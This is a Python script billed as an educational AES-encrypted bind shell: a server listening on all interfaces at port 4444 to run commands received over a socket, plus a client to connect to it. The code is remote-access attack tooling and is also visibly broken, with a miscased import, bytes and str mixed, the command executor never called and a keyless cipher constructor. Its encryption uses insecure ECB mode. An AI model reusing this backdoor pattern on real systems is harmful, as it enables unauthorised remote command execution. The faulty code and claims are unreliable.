#!/usr/bin/env python3
'''
Date : 1402/01/30
Author : AmirhosseinKhanshabani - @AmirZoyber
 
Encrypted Bind Shell - Encrypted Bind Shell in Python

this script is a bind shell that uses AES encryption to encrypt the data that is sent and received from the client.
using AES encryption is not a good idea because it is very slow and it is not recommended to use it in a bind shell.
this script is just for educational purposes and to show how AES encryption works.


'''

import socket, subprocess, threading, argparse
from Crypto.cipher import AES
from Crypto.Random import get_random_bytes
from Crypto.Util.Padding import pad, unpad

DEFAULT_PORT = 4444
MAX_BUFFER_SIZE = 4096

class AESCipher(object):
    def __init__(self, key):
        self.key = key

    def encrypt(self, raw):
        cipher = AES.new(self.key, AES.MODE_ECB)
        return cipher.encrypt(pad(raw, AES.block_size))

    def decrypt(self, enc):
        cipher = AES.new(self.key, AES.MODE_ECB)
        return unpad(cipher.decrypt(enc), AES.block_size)
    
    def __str__(self) -> str:
        return "key = " + self.key.hex()
    
def encrypt_and_send(s, msg):
    s.send(cipher.encrypt(msg).encode())



def execute_cmd(cmd):
    try:
        output = subprocess.check_output(cmd, shell=True)
    except subprocess.CalledProcessError as e:
        output = e.output
    return output

print(execute_cmd("pwd")) # output: /home/amir/Desktop/Python/EncryptedBindShell

def decode_and_strip(s):
    return s.decode().strip()

def shell_thread(s):
    s.send(b"[*] Connection Established") # output: [*] Connection Established
    encrypt_and_send(s, b"[*] Enter Key: ") # output: [*] Enter Key:
    try:
        while True:
            s.send(b"[*] Enter Command: ") # output: [*] Enter Command:
            data = s.recv(MAX_BUFFER_SIZE)
            if data:
                buffer = decode_and_strip(data)
                if not buffer or buffer == "exit":
                    s.close()
                    exit()
            print(f"[*] Command Received-Executing : {buffer}") # output: [*] Command Received-Executing : pwd
            s.send(b"[*] Command Received-Executing : " + buffer) # output: [*] Command Received-Executing : pwd
    except:
        s.close()
        exit()

def send_thread(s):
    try:
        while True:
            data = decode_and_strip(s.recv(MAX_BUFFER_SIZE))
            if data:
                print(data,flush=True)
    except:
        s.close()
        exit()

def recv_thread(s):
    try:
        while True:
            cmd = input()
            if not cmd or cmd == "exit":
                s.close()
                exit()
            s.send(cmd.encode())
    except:
        s.close()
        exit()

def server():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(("0.0.0.0", DEFAULT_PORT))
    s.listen()
    print(f"[*] Listening on port {DEFAULT_PORT}") # output: [*] Listening on port 4444
    while True:
        clinetSocket, addr = s.accept()
        print(f"[*] Connection from {addr[0]}:{addr[1]}") # output: [*] Connection from
        threading.Thread(target=shell_thread, args=(clinetSocket,)).start()


def client(ip):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ip, DEFAULT_PORT))
    print(f"[*] Connected to {ip}:{DEFAULT_PORT}") # output: [*] Connected to
    threading.Thread(target=send_thread, args=(s,)).start()
    threading.Thread(target=recv_thread, args=(s,)).start()

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("-l", "--listen", help="Listen on IP", type=str)
    parser.add_argument("-c", "--connect", help="Connect to IP", type=str)
    parser.add_argument("-k", "--key", help="Key", type=str)
    args = parser.parse_args()

    if args.connect and not args.key:
        parser.error("[-] Please specify a key")
    
    if args.key:
        cipher = AESCipher(args.key.encode())
    else:
        cipher = AESCipher()

    print(cipher) # output : 

    if args.listen:
        server()
    elif args.connect:
        client(args.connect)
    
